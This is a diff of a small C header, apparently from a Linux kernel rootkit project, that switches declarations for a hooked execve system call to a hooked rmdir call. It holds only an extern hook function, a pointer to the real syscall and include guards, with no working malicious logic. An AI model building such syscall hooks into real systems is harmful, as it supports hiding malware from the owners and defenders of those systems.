@@ -1,13 +1,13 @@
-#ifndef RK_HOOKS_EXECVE_H
-#define RK_HOOKS_EXECVE_H
+#ifndef RK_HOOKS_RMDIR_H
+#define RK_HOOKS_RMDIR_H
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-extern asmlinkage long hook_execve(const struct pt_regs *regs);
-extern asmlinkage long (*real_execve)(const struct pt_regs *);
+extern asmlinkage long hook_rmdir(const struct pt_regs *regs);
+extern asmlinkage long (*real_rmdir)(const struct pt_regs *);
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-#endif // RK_HOOKS_EXECVE_H
+#endif // RK_HOOKS_RMDIR_H
